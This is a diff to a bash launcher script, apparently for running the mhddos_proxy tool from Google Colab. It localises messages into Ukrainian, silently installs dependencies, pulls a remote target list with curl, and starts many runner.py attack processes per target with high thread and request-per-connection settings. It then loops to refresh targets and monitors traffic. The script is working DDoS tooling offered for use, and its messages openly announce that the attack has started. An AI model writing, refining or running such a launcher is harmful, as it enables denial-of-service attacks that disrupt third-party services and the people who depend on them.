@@ -9,7 +9,7 @@ set -o errexit -o pipefail -o noclobber -o nounset
 # -use return value from ${PIPESTATUS[0]}, because ! hosed $?
 ! getopt --test > /dev/null
 if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
-    echo 'I am sorry, `getopt --test` failed in this environment. Please, install enhanced getopt.'
+    echo "На жаль, `getopt --test` завершився з помилкою. Будь ласка, встановіть enhanced getopt."
     exit 1
 fi
 
@@ -64,8 +64,7 @@ while true; do
             break
             ;;
         *)
-            echo "$1"
-            echo "Programming error"
+            echo "Невідома опція запуску $1"
             exit 3
             ;;
     esac
@@ -76,6 +75,15 @@ PROXY_PROJECT_VERSION=d3700c0538a3b76944a54c968ccdc88b71016a4d
 
 PROXY_DIR=~/$PROXY_PROJECT_NAME
 PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt
+
+echo "Підготовка середовища для запуску DDoS..."
+
+# make sure ifstat and awk are installed
+apt-get install ifstat gawk -y &> /dev/null
+
+# remove unnecessary built-in python dependencies
+python3 -m pip uninstall google-colab datascience -y &> /dev/null
+python3 -m pip install --upgrade pip &> /dev/null
 
 # run within user directory
 cd ~
@@ -93,15 +101,17 @@ git checkout $PROXY_PROJECT_VERSION &> /dev/null
 # install mhddos_proxy dependencies
 python3 -m pip install -r requirements.txt &> /dev/null
 
+echo "Підготовка середовища для запуску DDoS... ГОТОВО!"
+
 # Restart attacks and update targets every $refresh_interval
 while true
 do
     # kill old copies of mhddos_proxy
-    echo -e "\nDDoS is (RE)STARTING. Killing old processes..."
+    echo "DDoS (ре)стартує. Завершення попередніх процесів..."
     if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
     if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
-    echo -e "\nDDoS is (RE)STARTING. Killing old processes... DONE!"
+    echo "DDoS (ре)стартує. Завершення попередніх процесів... ГОТОВО!"
 
     # delete old proxy file if present
     if [ -f $PROXY_FILE ]; then
@@ -110,32 +120,31 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
+      echo "Запускаємо $process_count процесів для атаки $target_command -t $thread_count -p 25200 --rpc 1000"
+
       for (( i=1; i<=process_count; i++ ))
       do
-          echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"
-
           cd $PROXY_DIR
-          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&
+          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&
 
           # wait till the first process initializes proxy file properly
           if [ ! -f $PROXY_FILE ]; then
-              echo -e "\nWaiting for proxies initialization. This might take several minutes..."
+              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин..."
 
               while [ ! -f $PROXY_FILE ]
               do
                   sleep 1
               done
 
-              echo -e "\nWaiting for proxies initialization. This might take several minutes... DONE!"
+              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин... ГОТОВО!"
           fi
       done
   done
 
-  ifstat -i eth0 -t -b $stats_interval/$stats_interval&
+  echo -e "DDoS атака почалася. Активовано моніторинг трафіку на інтерфейсі eth0 (відображається поточний час, вхідна та вихідна швидкість у MB за секунду).\nНаступна перевірка цілей відбудеться через $refresh_interval\n"
 
-  echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"
+  ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
 
   sleep $refresh_interval
-  clear
 
 done
